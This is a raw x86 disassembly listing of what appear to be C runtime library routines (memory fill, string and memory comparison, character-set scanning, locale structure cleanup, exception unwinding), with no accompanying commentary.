  427a37:	push   ebx
  427a38:	push   ebx
  427a39:	lea    ecx,[ebp+0x14]
  427a3c:	push   ecx
  427a3d:	push   DWORD PTR [ebp+0x10]
  427a40:	push   eax
  427a41:	push   DWORD PTR [ebp+0x20]
  427a44:	call   0x4286f6
  427a49:	add    esp,0x18
  427a4c:	mov    DWORD PTR [ebp-0x34],eax
  427a4f:	cmp    eax,ebx
  427a51:	je     0x427a27
  427a53:	push   ebx
  427a54:	push   ebx
  427a55:	push   DWORD PTR [ebp+0x14]
  427a58:	push   eax
  427a59:	push   DWORD PTR [ebp+0xc]
  427a5c:	push   DWORD PTR [ebp+0x8]
  427a5f:	call   DWORD PTR ds:0x429124
  427a65:	mov    esi,eax
  427a67:	mov    DWORD PTR [ebp-0x40],esi
  427a6a:	cmp    esi,ebx
  427a6c:	je     0x427b14
  427a72:	mov    DWORD PTR [ebp-0x4],ebx
  427a75:	add    eax,0x3
  427a78:	and    eax,0xfffffffc
  427a7b:	call   0x425480
  427a80:	mov    DWORD PTR [ebp-0x18],esp
  427a83:	mov    edi,esp
  427a85:	mov    DWORD PTR [ebp-0x44],edi
  427a88:	push   esi
  427a89:	push   ebx
  427a8a:	push   edi
  427a8b:	call   0x427d30
  427a90:	add    esp,0xc
  427a93:	jmp    0x427aa5
  427a95:	xor    eax,eax
  427a97:	inc    eax
  427a98:	ret    
  427a99:	mov    esp,DWORD PTR [ebp-0x18]
  427a9c:	call   0x4288c5
  427aa1:	xor    ebx,ebx
  427aa3:	xor    edi,edi
  427aa5:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa9:	cmp    edi,ebx
  427aab:	jne    0x427ad0
  427aad:	push   DWORD PTR [ebp-0x40]
  427ab0:	call   0x426152
  427ab5:	pop    ecx
  427ab6:	mov    edi,eax
  427ab8:	cmp    edi,ebx
  427aba:	je     0x427aed
  427abc:	push   DWORD PTR [ebp-0x40]
  427abf:	push   ebx
  427ac0:	push   edi
  427ac1:	call   0x427d30
  427ac6:	add    esp,0xc
  427ac9:	mov    DWORD PTR [ebp-0x38],0x1
  427ad0:	push   DWORD PTR [ebp-0x40]
  427ad3:	push   edi
  427ad4:	push   DWORD PTR [ebp+0x14]
  427ad7:	push   DWORD PTR [ebp-0x34]
  427ada:	push   DWORD PTR [ebp+0xc]
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429124
  427ae6:	mov    DWORD PTR [ebp-0x40],eax
  427ae9:	cmp    eax,ebx
  427aeb:	jne    0x427af1
  427aed:	xor    esi,esi
  427aef:	jmp    0x427b17
  427af1:	push   DWORD PTR [ebp+0x1c]
  427af4:	push   DWORD PTR [ebp+0x18]
  427af7:	lea    eax,[ebp-0x40]
  427afa:	push   eax
  427afb:	push   edi
  427afc:	push   DWORD PTR [ebp+0x20]
  427aff:	push   DWORD PTR [ebp-0x3c]
  427b02:	call   0x4286f6
  427b07:	add    esp,0x18
  427b0a:	mov    esi,eax
  427b0c:	neg    esi
  427b0e:	sbb    esi,esi
  427b10:	neg    esi
  427b12:	jmp    0x427b17
  427b14:	mov    esi,DWORD PTR [ebp-0x48]
  427b17:	cmp    DWORD PTR [ebp-0x38],ebx
  427b1a:	je     0x427b3f
  427b1c:	push   edi
  427b1d:	call   0x42603a
  427b22:	pop    ecx
  427b23:	jmp    0x427b3f
  427b25:	push   DWORD PTR [ebp+0x1c]
  427b28:	push   DWORD PTR [ebp+0x18]
  427b2b:	push   DWORD PTR [ebp+0x14]
  427b2e:	push   DWORD PTR [ebp+0x10]
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   DWORD PTR [ebp+0x8]
  427b37:	call   DWORD PTR ds:0x429124
  427b3d:	mov    esi,eax
  427b3f:	cmp    DWORD PTR [ebp-0x34],ebx
  427b42:	je     0x427b4d
  427b44:	push   DWORD PTR [ebp-0x34]
  427b47:	call   0x42603a
  427b4c:	pop    ecx
  427b4d:	mov    eax,esi
  427b4f:	lea    esp,[ebp-0x54]
  427b52:	call   0x42546f
  427b57:	ret    
  427b58:	push   0x1c
  427b5a:	push   0x429ec8
  427b5f:	call   0x425434
  427b64:	xor    esi,esi
  427b66:	cmp    DWORD PTR ds:0x4638c0,esi
  427b6c:	jne    0x427ba3
  427b6e:	lea    eax,[ebp-0x1c]
  427b71:	push   eax
  427b72:	xor    edi,edi
  427b74:	inc    edi
  427b75:	push   edi
  427b76:	push   0x429e9c
  427b7b:	push   edi
  427b7c:	call   DWORD PTR ds:0x429134
  427b82:	test   eax,eax
  427b84:	je     0x427b8e
  427b86:	mov    DWORD PTR ds:0x4638c0,edi
  427b8c:	jmp    0x427ba3
  427b8e:	call   DWORD PTR ds:0x429030
  427b94:	cmp    eax,0x78
  427b97:	jne    0x427ba3
  427b99:	mov    DWORD PTR ds:0x4638c0,0x2
  427ba3:	mov    eax,ds:0x4638c0
  427ba8:	cmp    eax,0x2
  427bab:	je     0x427c9b
  427bb1:	cmp    eax,esi
  427bb3:	je     0x427c9b
  427bb9:	cmp    eax,0x1
  427bbc:	jne    0x427cc1
  427bc2:	mov    DWORD PTR [ebp-0x20],esi
  427bc5:	mov    DWORD PTR [ebp-0x24],esi
  427bc8:	cmp    DWORD PTR [ebp+0x18],esi
  427bcb:	jne    0x427bd5
  427bcd:	mov    eax,ds:0x4638b4
  427bd2:	mov    DWORD PTR [ebp+0x18],eax
  427bd5:	push   esi
  427bd6:	push   esi
  427bd7:	push   DWORD PTR [ebp+0x10]
  427bda:	push   DWORD PTR [ebp+0xc]
  427bdd:	xor    eax,eax
  427bdf:	cmp    DWORD PTR [ebp+0x20],esi
  427be2:	setne  al
  427be5:	lea    eax,[eax*8+0x1]
  427bec:	push   eax
  427bed:	push   DWORD PTR [ebp+0x18]
  427bf0:	call   DWORD PTR ds:0x429128
  427bf6:	mov    edi,eax
  427bf8:	mov    DWORD PTR [ebp-0x28],edi
  427bfb:	test   edi,edi
  427bfd:	je     0x427cc1
  427c03:	and    DWORD PTR [ebp-0x4],0x0
  427c07:	lea    ebx,[edi+edi*1]
  427c0a:	mov    eax,ebx
  427c0c:	add    eax,0x3
  427c0f:	and    eax,0xfffffffc
  427c12:	call   0x425480
  427c17:	mov    DWORD PTR [ebp-0x18],esp
  427c1a:	mov    esi,esp
  427c1c:	mov    DWORD PTR [ebp-0x2c],esi
  427c1f:	push   ebx
  427c20:	push   0x0
  427c22:	push   esi
  427c23:	call   0x427d30
  427c28:	add    esp,0xc
  427c2b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c2f:	jmp    0x427c46
  427c31:	xor    eax,eax
  427c33:	inc    eax
  427c34:	ret    
  427c35:	mov    esp,DWORD PTR [ebp-0x18]
  427c38:	call   0x4288c5
  427c3d:	xor    esi,esi
  427c3f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c43:	mov    edi,DWORD PTR [ebp-0x28]
  427c46:	test   esi,esi
  427c48:	jne    0x427c61
  427c4a:	push   edi
  427c4b:	push   0x2
  427c4d:	call   0x426548
  427c52:	pop    ecx
  427c53:	pop    ecx
  427c54:	mov    esi,eax
  427c56:	test   esi,esi
  427c58:	je     0x427cc1
  427c5a:	mov    DWORD PTR [ebp-0x24],0x1
  427c61:	push   edi
  427c62:	push   esi
  427c63:	push   DWORD PTR [ebp+0x10]
  427c66:	push   DWORD PTR [ebp+0xc]
  427c69:	push   0x1
  427c6b:	push   DWORD PTR [ebp+0x18]
  427c6e:	call   DWORD PTR ds:0x429128
  427c74:	test   eax,eax
  427c76:	je     0x427c89
  427c78:	push   DWORD PTR [ebp+0x14]
  427c7b:	push   eax
  427c7c:	push   esi
  427c7d:	push   DWORD PTR [ebp+0x8]
  427c80:	call   DWORD PTR ds:0x429134
  427c86:	mov    DWORD PTR [ebp-0x20],eax
  427c89:	cmp    DWORD PTR [ebp-0x24],0x0
  427c8d:	je     0x427c96
  427c8f:	push   esi
  427c90:	call   0x42603a
  427c95:	pop    ecx
  427c96:	mov    eax,DWORD PTR [ebp-0x20]
  427c99:	jmp    0x427d09
  427c9b:	mov    ebx,DWORD PTR [ebp+0x1c]
  427c9e:	cmp    ebx,esi
  427ca0:	jne    0x427ca8
  427ca2:	mov    ebx,DWORD PTR ds:0x4638a4
  427ca8:	mov    edi,DWORD PTR [ebp+0x18]
  427cab:	test   edi,edi
  427cad:	jne    0x427cb5
  427caf:	mov    edi,DWORD PTR ds:0x4638b4
  427cb5:	push   ebx
  427cb6:	call   0x4286ad
  427cbb:	pop    ecx
  427cbc:	cmp    eax,0xffffffff
  427cbf:	jne    0x427cc5
  427cc1:	xor    eax,eax
  427cc3:	jmp    0x427d09
  427cc5:	cmp    eax,edi
  427cc7:	je     0x427ce7
  427cc9:	push   0x0
  427ccb:	push   0x0
  427ccd:	lea    ecx,[ebp+0x10]
  427cd0:	push   ecx
  427cd1:	push   DWORD PTR [ebp+0xc]
  427cd4:	push   eax
  427cd5:	push   edi
  427cd6:	call   0x4286f6
  427cdb:	add    esp,0x18
  427cde:	mov    esi,eax
  427ce0:	test   esi,esi
  427ce2:	je     0x427cc1
  427ce4:	mov    DWORD PTR [ebp+0xc],esi
  427ce7:	push   DWORD PTR [ebp+0x14]
  427cea:	push   DWORD PTR [ebp+0x10]
  427ced:	push   DWORD PTR [ebp+0xc]
  427cf0:	push   DWORD PTR [ebp+0x8]
  427cf3:	push   ebx
  427cf4:	call   DWORD PTR ds:0x429130
  427cfa:	mov    edi,eax
  427cfc:	test   esi,esi
  427cfe:	je     0x427d07
  427d00:	push   esi
  427d01:	call   0x42603a
  427d06:	pop    ecx
  427d07:	mov    eax,edi
  427d09:	lea    esp,[ebp-0x38]
  427d0c:	call   0x42546f
  427d11:	ret    
  427d12:	mov    eax,ds:0x4638c4
  427d17:	test   eax,eax
  427d19:	je     0x427d2a
  427d1b:	push   DWORD PTR [esp+0x4]
  427d1f:	call   eax
  427d21:	test   eax,eax
  427d23:	pop    ecx
  427d24:	je     0x427d2a
  427d26:	xor    eax,eax
  427d28:	inc    eax
  427d29:	ret    
  427d2a:	xor    eax,eax
  427d2c:	ret    
  427d2d:	int3   
  427d2e:	int3   
  427d2f:	int3   
  427d30:	mov    edx,DWORD PTR [esp+0xc]
  427d34:	mov    ecx,DWORD PTR [esp+0x4]
  427d38:	test   edx,edx
  427d3a:	je     0x427d8b
  427d3c:	xor    eax,eax
  427d3e:	mov    al,BYTE PTR [esp+0x8]
  427d42:	push   edi
  427d43:	mov    edi,ecx
  427d45:	cmp    edx,0x4
  427d48:	jb     0x427d7b
  427d4a:	neg    ecx
  427d4c:	and    ecx,0x3
  427d4f:	je     0x427d5d
  427d51:	sub    edx,ecx
  427d53:	mov    BYTE PTR [edi],al
  427d55:	add    edi,0x1
  427d58:	sub    ecx,0x1
  427d5b:	jne    0x427d53
  427d5d:	mov    ecx,eax
  427d5f:	shl    eax,0x8
  427d62:	add    eax,ecx
  427d64:	mov    ecx,eax
  427d66:	shl    eax,0x10
  427d69:	add    eax,ecx
  427d6b:	mov    ecx,edx
  427d6d:	and    edx,0x3
  427d70:	shr    ecx,0x2
  427d73:	je     0x427d7b
  427d75:	rep stos DWORD PTR es:[edi],eax
  427d77:	test   edx,edx
  427d79:	je     0x427d85
  427d7b:	mov    BYTE PTR [edi],al
  427d7d:	add    edi,0x1
  427d80:	sub    edx,0x1
  427d83:	jne    0x427d7b
  427d85:	mov    eax,DWORD PTR [esp+0x8]
  427d89:	pop    edi
  427d8a:	ret    
  427d8b:	mov    eax,DWORD PTR [esp+0x4]
  427d8f:	ret    
  427d90:	push   esi
  427d91:	mov    esi,DWORD PTR [esp+0x8]
  427d95:	test   esi,esi
  427d97:	je     0x427f1e
  427d9d:	push   DWORD PTR [esi+0x4]
  427da0:	call   0x42603a
  427da5:	push   DWORD PTR [esi+0x8]
  427da8:	call   0x42603a
  427dad:	push   DWORD PTR [esi+0xc]
  427db0:	call   0x42603a
  427db5:	push   DWORD PTR [esi+0x10]
  427db8:	call   0x42603a
  427dbd:	push   DWORD PTR [esi+0x14]
  427dc0:	call   0x42603a
  427dc5:	push   DWORD PTR [esi+0x18]
  427dc8:	call   0x42603a
  427dcd:	push   DWORD PTR [esi]
  427dcf:	call   0x42603a
  427dd4:	push   DWORD PTR [esi+0x20]
  427dd7:	call   0x42603a
  427ddc:	push   DWORD PTR [esi+0x24]
  427ddf:	call   0x42603a
  427de4:	push   DWORD PTR [esi+0x28]
  427de7:	call   0x42603a
  427dec:	push   DWORD PTR [esi+0x2c]
  427def:	call   0x42603a
  427df4:	push   DWORD PTR [esi+0x30]
  427df7:	call   0x42603a
  427dfc:	push   DWORD PTR [esi+0x34]
  427dff:	call   0x42603a
  427e04:	push   DWORD PTR [esi+0x1c]
  427e07:	call   0x42603a
  427e0c:	push   DWORD PTR [esi+0x38]
  427e0f:	call   0x42603a
  427e14:	push   DWORD PTR [esi+0x3c]
  427e17:	call   0x42603a
  427e1c:	add    esp,0x40
  427e1f:	push   DWORD PTR [esi+0x40]
  427e22:	call   0x42603a
  427e27:	push   DWORD PTR [esi+0x44]
  427e2a:	call   0x42603a
  427e2f:	push   DWORD PTR [esi+0x48]
  427e32:	call   0x42603a
  427e37:	push   DWORD PTR [esi+0x4c]
  427e3a:	call   0x42603a
  427e3f:	push   DWORD PTR [esi+0x50]
  427e42:	call   0x42603a
  427e47:	push   DWORD PTR [esi+0x54]
  427e4a:	call   0x42603a
  427e4f:	push   DWORD PTR [esi+0x58]
  427e52:	call   0x42603a
  427e57:	push   DWORD PTR [esi+0x5c]
  427e5a:	call   0x42603a
  427e5f:	push   DWORD PTR [esi+0x60]
  427e62:	call   0x42603a
  427e67:	push   DWORD PTR [esi+0x64]
  427e6a:	call   0x42603a
  427e6f:	push   DWORD PTR [esi+0x68]
  427e72:	call   0x42603a
  427e77:	push   DWORD PTR [esi+0x6c]
  427e7a:	call   0x42603a
  427e7f:	push   DWORD PTR [esi+0x70]
  427e82:	call   0x42603a
  427e87:	push   DWORD PTR [esi+0x74]
  427e8a:	call   0x42603a
  427e8f:	push   DWORD PTR [esi+0x78]
  427e92:	call   0x42603a
  427e97:	push   DWORD PTR [esi+0x7c]
  427e9a:	call   0x42603a
  427e9f:	add    esp,0x40
  427ea2:	push   DWORD PTR [esi+0x80]
  427ea8:	call   0x42603a
  427ead:	push   DWORD PTR [esi+0x84]
  427eb3:	call   0x42603a
  427eb8:	push   DWORD PTR [esi+0x88]
  427ebe:	call   0x42603a
  427ec3:	push   DWORD PTR [esi+0x8c]
  427ec9:	call   0x42603a
  427ece:	push   DWORD PTR [esi+0x90]
  427ed4:	call   0x42603a
  427ed9:	push   DWORD PTR [esi+0x94]
  427edf:	call   0x42603a
  427ee4:	push   DWORD PTR [esi+0x98]
  427eea:	call   0x42603a
  427eef:	push   DWORD PTR [esi+0x9c]
  427ef5:	call   0x42603a
  427efa:	push   DWORD PTR [esi+0xa0]
  427f00:	call   0x42603a
  427f05:	push   DWORD PTR [esi+0xa4]
  427f0b:	call   0x42603a
  427f10:	push   DWORD PTR [esi+0xa8]
  427f16:	call   0x42603a
  427f1b:	add    esp,0x2c
  427f1e:	pop    esi
  427f1f:	ret    
  427f20:	push   esi
  427f21:	mov    esi,DWORD PTR [esp+0x8]
  427f25:	test   esi,esi
  427f27:	je     0x427f7d
  427f29:	mov    eax,DWORD PTR [esi]
  427f2b:	mov    ecx,DWORD PTR ds:0x463434
  427f31:	cmp    eax,DWORD PTR [ecx]
  427f33:	je     0x427f44
  427f35:	cmp    eax,DWORD PTR ds:0x463404
  427f3b:	je     0x427f44
  427f3d:	push   eax
  427f3e:	call   0x42603a
  427f43:	pop    ecx
  427f44:	mov    eax,DWORD PTR [esi+0x4]
  427f47:	mov    ecx,DWORD PTR ds:0x463434
  427f4d:	cmp    eax,DWORD PTR [ecx+0x4]
  427f50:	je     0x427f61
  427f52:	cmp    eax,DWORD PTR ds:0x463408
  427f58:	je     0x427f61
  427f5a:	push   eax
  427f5b:	call   0x42603a
  427f60:	pop    ecx
  427f61:	mov    esi,DWORD PTR [esi+0x8]
  427f64:	mov    eax,ds:0x463434
  427f69:	cmp    esi,DWORD PTR [eax+0x8]
  427f6c:	je     0x427f7d
  427f6e:	cmp    esi,DWORD PTR ds:0x46340c
  427f74:	je     0x427f7d
  427f76:	push   esi
  427f77:	call   0x42603a
  427f7c:	pop    ecx
  427f7d:	pop    esi
  427f7e:	ret    
  427f7f:	push   esi
  427f80:	mov    esi,DWORD PTR [esp+0x8]
  427f84:	test   esi,esi
  427f86:	je     0x428056
  427f8c:	mov    eax,DWORD PTR [esi+0xc]
  427f8f:	mov    ecx,DWORD PTR ds:0x463434
  427f95:	cmp    eax,DWORD PTR [ecx+0xc]
  427f98:	je     0x427fa9
  427f9a:	cmp    eax,DWORD PTR ds:0x463410
  427fa0:	je     0x427fa9
  427fa2:	push   eax
  427fa3:	call   0x42603a
  427fa8:	pop    ecx
  427fa9:	mov    eax,DWORD PTR [esi+0x10]
  427fac:	mov    ecx,DWORD PTR ds:0x463434
  427fb2:	cmp    eax,DWORD PTR [ecx+0x10]
  427fb5:	je     0x427fc6
  427fb7:	cmp    eax,DWORD PTR ds:0x463414
  427fbd:	je     0x427fc6
  427fbf:	push   eax
  427fc0:	call   0x42603a
  427fc5:	pop    ecx
  427fc6:	mov    eax,DWORD PTR [esi+0x14]
  427fc9:	mov    ecx,DWORD PTR ds:0x463434
  427fcf:	cmp    eax,DWORD PTR [ecx+0x14]
  427fd2:	je     0x427fe3
  427fd4:	cmp    eax,DWORD PTR ds:0x463418
  427fda:	je     0x427fe3
  427fdc:	push   eax
  427fdd:	call   0x42603a
  427fe2:	pop    ecx
  427fe3:	mov    eax,DWORD PTR [esi+0x18]
  427fe6:	mov    ecx,DWORD PTR ds:0x463434
  427fec:	cmp    eax,DWORD PTR [ecx+0x18]
  427fef:	je     0x428000
  427ff1:	cmp    eax,DWORD PTR ds:0x46341c
  427ff7:	je     0x428000
  427ff9:	push   eax
  427ffa:	call   0x42603a
  427fff:	pop    ecx
  428000:	mov    eax,DWORD PTR [esi+0x1c]
  428003:	mov    ecx,DWORD PTR ds:0x463434
  428009:	cmp    eax,DWORD PTR [ecx+0x1c]
  42800c:	je     0x42801d
  42800e:	cmp    eax,DWORD PTR ds:0x463420
  428014:	je     0x42801d
  428016:	push   eax
  428017:	call   0x42603a
  42801c:	pop    ecx
  42801d:	mov    eax,DWORD PTR [esi+0x20]
  428020:	mov    ecx,DWORD PTR ds:0x463434
  428026:	cmp    eax,DWORD PTR [ecx+0x20]
  428029:	je     0x42803a
  42802b:	cmp    eax,DWORD PTR ds:0x463424
  428031:	je     0x42803a
  428033:	push   eax
  428034:	call   0x42603a
  428039:	pop    ecx
  42803a:	mov    esi,DWORD PTR [esi+0x24]
  42803d:	mov    eax,ds:0x463434
  428042:	cmp    esi,DWORD PTR [eax+0x24]
  428045:	je     0x428056
  428047:	cmp    esi,DWORD PTR ds:0x463428
  42804d:	je     0x428056
  42804f:	push   esi
  428050:	call   0x42603a
  428055:	pop    ecx
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   esi
  428064:	xor    eax,eax
  428066:	push   eax
  428067:	push   eax
  428068:	push   eax
  428069:	push   eax
  42806a:	push   eax
  42806b:	push   eax
  42806c:	push   eax
  42806d:	push   eax
  42806e:	mov    edx,DWORD PTR [ebp+0xc]
  428071:	lea    ecx,[ecx+0x0]
  428074:	mov    al,BYTE PTR [edx]
  428076:	or     al,al
  428078:	je     0x428083
  42807a:	add    edx,0x1
  42807d:	bts    DWORD PTR [esp],eax
  428081:	jmp    0x428074
  428083:	mov    esi,DWORD PTR [ebp+0x8]
  428086:	or     ecx,0xffffffff
  428089:	lea    ecx,[ecx+0x0]
  42808c:	add    ecx,0x1
  42808f:	mov    al,BYTE PTR [esi]
  428091:	or     al,al
  428093:	je     0x42809e
  428095:	add    esi,0x1
  428098:	bt     DWORD PTR [esp],eax
  42809c:	jae    0x42808c
  42809e:	mov    eax,ecx
  4280a0:	add    esp,0x20
  4280a3:	pop    esi
  4280a4:	leave  
  4280a5:	ret    
  4280a6:	int3   
  4280a7:	int3   
  4280a8:	int3   
  4280a9:	int3   
  4280aa:	int3   
  4280ab:	int3   
  4280ac:	int3   
  4280ad:	int3   
  4280ae:	int3   
  4280af:	int3   
  4280b0:	mov    edx,DWORD PTR [esp+0x4]
  4280b4:	mov    ecx,DWORD PTR [esp+0x8]
  4280b8:	test   edx,0x3
  4280be:	jne    0x4280fc
  4280c0:	mov    eax,DWORD PTR [edx]
  4280c2:	cmp    al,BYTE PTR [ecx]
  4280c4:	jne    0x4280f4
  4280c6:	or     al,al
  4280c8:	je     0x4280f0
  4280ca:	cmp    ah,BYTE PTR [ecx+0x1]
  4280cd:	jne    0x4280f4
  4280cf:	or     ah,ah
  4280d1:	je     0x4280f0
  4280d3:	shr    eax,0x10
  4280d6:	cmp    al,BYTE PTR [ecx+0x2]
  4280d9:	jne    0x4280f4
  4280db:	or     al,al
  4280dd:	je     0x4280f0
  4280df:	cmp    ah,BYTE PTR [ecx+0x3]
  4280e2:	jne    0x4280f4
  4280e4:	add    ecx,0x4
  4280e7:	add    edx,0x4
  4280ea:	or     ah,ah
  4280ec:	jne    0x4280c0
  4280ee:	mov    edi,edi
  4280f0:	xor    eax,eax
  4280f2:	ret    
  4280f3:	nop
  4280f4:	sbb    eax,eax
  4280f6:	shl    eax,1
  4280f8:	add    eax,0x1
  4280fb:	ret    
  4280fc:	test   edx,0x1
  428102:	je     0x42811c
  428104:	mov    al,BYTE PTR [edx]
  428106:	add    edx,0x1
  428109:	cmp    al,BYTE PTR [ecx]
  42810b:	jne    0x4280f4
  42810d:	add    ecx,0x1
  428110:	or     al,al
  428112:	je     0x4280f0
  428114:	test   edx,0x2
  42811a:	je     0x4280c0
  42811c:	mov    ax,WORD PTR [edx]
  42811f:	add    edx,0x2
  428122:	cmp    al,BYTE PTR [ecx]
  428124:	jne    0x4280f4
  428126:	or     al,al
  428128:	je     0x4280f0
  42812a:	cmp    ah,BYTE PTR [ecx+0x1]
  42812d:	jne    0x4280f4
  42812f:	or     ah,ah
  428131:	je     0x4280f0
  428133:	add    ecx,0x2
  428136:	jmp    0x4280c0
  428138:	int3   
  428139:	int3   
  42813a:	int3   
  42813b:	int3   
  42813c:	int3   
  42813d:	int3   
  42813e:	int3   
  42813f:	int3   
  428140:	mov    eax,DWORD PTR [esp+0xc]
  428144:	test   eax,eax
  428146:	je     0x428192
  428148:	mov    edx,DWORD PTR [esp+0x4]
  42814c:	push   esi
  42814d:	push   edi
  42814e:	mov    esi,edx
  428150:	mov    edi,DWORD PTR [esp+0x10]
  428154:	or     edx,edi
  428156:	and    edx,0x3
  428159:	je     0x428193
  42815b:	test   eax,0x1
  428160:	je     0x428173
  428162:	mov    cl,BYTE PTR [esi]
  428164:	cmp    cl,BYTE PTR [edi]
  428166:	jne    0x4281c0
  428168:	add    esi,0x1
  42816b:	add    edi,0x1
  42816e:	sub    eax,0x1
  428171:	je     0x428190
  428173:	mov    cl,BYTE PTR [esi]
  428175:	mov    dl,BYTE PTR [edi]
  428177:	cmp    cl,dl
  428179:	jne    0x4281c0
  42817b:	mov    cl,BYTE PTR [esi+0x1]
  42817e:	mov    dl,BYTE PTR [edi+0x1]
  428181:	cmp    cl,dl
  428183:	jne    0x4281c0
  428185:	add    edi,0x2
  428188:	add    esi,0x2
  42818b:	sub    eax,0x2
  42818e:	jne    0x428173
  428190:	pop    edi
  428191:	pop    esi
  428192:	ret    
  428193:	mov    ecx,eax
  428195:	and    eax,0x3
  428198:	shr    ecx,0x2
  42819b:	je     0x4281c8
  42819d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42819f:	je     0x4281c8
  4281a1:	mov    ecx,DWORD PTR [esi-0x4]
  4281a4:	mov    edx,DWORD PTR [edi-0x4]
  4281a7:	cmp    cl,dl
  4281a9:	jne    0x4281bb
  4281ab:	cmp    ch,dh
  4281ad:	jne    0x4281bb
  4281af:	shr    ecx,0x10
  4281b2:	shr    edx,0x10
  4281b5:	cmp    cl,dl
  4281b7:	jne    0x4281bb
  4281b9:	cmp    ch,dh
  4281bb:	mov    eax,0x0
  4281c0:	sbb    eax,eax
  4281c2:	pop    edi
  4281c3:	sbb    eax,0xffffffff
  4281c6:	pop    esi
  4281c7:	ret    
  4281c8:	test   eax,eax
  4281ca:	je     0x428190
  4281cc:	mov    edx,DWORD PTR [esi]
  4281ce:	mov    ecx,DWORD PTR [edi]
  4281d0:	cmp    dl,cl
  4281d2:	jne    0x4281bb
  4281d4:	sub    eax,0x1
  4281d7:	je     0x4281f5
  4281d9:	cmp    dh,ch
  4281db:	jne    0x4281bb
  4281dd:	sub    eax,0x1
  4281e0:	je     0x4281f5
  4281e2:	and    ecx,0xff0000
  4281e8:	and    edx,0xff0000
  4281ee:	cmp    edx,ecx
  4281f0:	jne    0x4281bb
  4281f2:	sub    eax,0x1
  4281f5:	pop    edi
  4281f6:	pop    esi
  4281f7:	ret    
  4281f8:	int3   
  4281f9:	int3   
  4281fa:	int3   
  4281fb:	int3   
  4281fc:	int3   
  4281fd:	int3   
  4281fe:	int3   
  4281ff:	int3   
  428200:	push   ebp
  428201:	mov    ebp,esp
  428203:	push   edi
  428204:	push   esi
  428205:	push   ebx
  428206:	mov    ecx,DWORD PTR [ebp+0x10]
  428209:	jecxz  0x428232
  42820b:	mov    ebx,ecx
  42820d:	mov    edi,DWORD PTR [ebp+0x8]
  428210:	mov    esi,edi
  428212:	xor    eax,eax
  428214:	repnz scas al,BYTE PTR es:[edi]
  428216:	neg    ecx
  428218:	add    ecx,ebx
  42821a:	mov    edi,esi
  42821c:	mov    esi,DWORD PTR [ebp+0xc]
  42821f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428221:	mov    al,BYTE PTR [esi-0x1]
  428224:	xor    ecx,ecx
  428226:	cmp    al,BYTE PTR [edi-0x1]
  428229:	ja     0x428230
  42822b:	je     0x428232
  42822d:	sub    ecx,0x2
  428230:	not    ecx
  428232:	mov    eax,ecx
  428234:	pop    ebx
  428235:	pop    esi
  428236:	pop    edi
  428237:	leave  
  428238:	ret    
  428239:	int3   
  42823a:	int3   
  42823b:	int3   
  42823c:	int3   
  42823d:	int3   
  42823e:	int3   
  42823f:	int3   
  428240:	push   ebp
  428241:	mov    ebp,esp
  428243:	push   esi
  428244:	xor    eax,eax
  428246:	push   eax
  428247:	push   eax
  428248:	push   eax
  428249:	push   eax
  42824a:	push   eax
  42824b:	push   eax
  42824c:	push   eax
  42824d:	push   eax
  42824e:	mov    edx,DWORD PTR [ebp+0xc]
  428251:	lea    ecx,[ecx+0x0]
  428254:	mov    al,BYTE PTR [edx]
  428256:	or     al,al
  428258:	je     0x428263
  42825a:	add    edx,0x1
  42825d:	bts    DWORD PTR [esp],eax
  428261:	jmp    0x428254
  428263:	mov    esi,DWORD PTR [ebp+0x8]
  428266:	mov    edi,edi
  428268:	mov    al,BYTE PTR [esi]
  42826a:	or     al,al
  42826c:	je     0x42827a
  42826e:	add    esi,0x1
  428271:	bt     DWORD PTR [esp],eax
  428275:	jae    0x428268
  428277:	lea    eax,[esi-0x1]
  42827a:	add    esp,0x20
  42827d:	pop    esi
  42827e:	leave  
  42827f:	ret    
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   ebx
  428284:	push   esi
  428285:	push   edi
  428286:	push   ebp
  428287:	push   0x0
  428289:	push   0x0
  42828b:	push   0x428298
  428290:	push   DWORD PTR [ebp+0x8]
  428293:	call   0x428d0e
  428298:	pop    ebp
  428299:	pop    edi
  42829a:	pop    esi
  42829b:	pop    ebx
  42829c:	mov    esp,ebp
  42829e:	pop    ebp
  42829f:	ret    
  4282a0:	mov    ecx,DWORD PTR [esp+0x4]
  4282a4:	test   DWORD PTR [ecx+0x4],0x6
  4282ab:	mov    eax,0x1
  4282b0:	je     0x4282c1
  4282b2:	mov    eax,DWORD PTR [esp+0x8]
  4282b6:	mov    edx,DWORD PTR [esp+0x10]
  4282ba:	mov    DWORD PTR [edx],eax
  4282bc:	mov    eax,0x3
  4282c1:	ret    
  4282c2:	push   ebx
  4282c3:	push   esi
  4282c4:	push   edi
  4282c5:	mov    eax,DWORD PTR [esp+0x10]
  4282c9:	push   eax
  4282ca:	push   0xfffffffe
  4282cc:	push   0x4282a0
  4282d1:	push   DWORD PTR fs:0x0
  4282d8:	mov    DWORD PTR fs:0x0,esp
  4282df:	mov    eax,DWORD PTR [esp+0x20]
  4282e3:	mov    ebx,DWORD PTR [eax+0x8]
  4282e6:	mov    esi,DWORD PTR [eax+0xc]
  4282e9:	cmp    esi,0xffffffff
  4282ec:	je     0x42831c
  4282ee:	cmp    esi,DWORD PTR [esp+0x24]
  4282f2:	je     0x42831c
  4282f4:	lea    esi,[esi+esi*2]
  4282f7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4282fa:	mov    DWORD PTR [esp+0x8],ecx
  4282fe:	mov    DWORD PTR [eax+0xc],ecx
  428301:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428306:	jne    0x42831a
  428308:	push   0x101
  42830d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428311:	call   0x428356
  428316:	call   DWORD PTR [ebx+esi*4+0x8]
  42831a:	jmp    0x4282df
  42831c:	pop    DWORD PTR fs:0x0
  428323:	add    esp,0xc
  428326:	pop    edi
  428327:	pop    esi
  428328:	pop    ebx
  428329:	ret    
  42832a:	xor    eax,eax
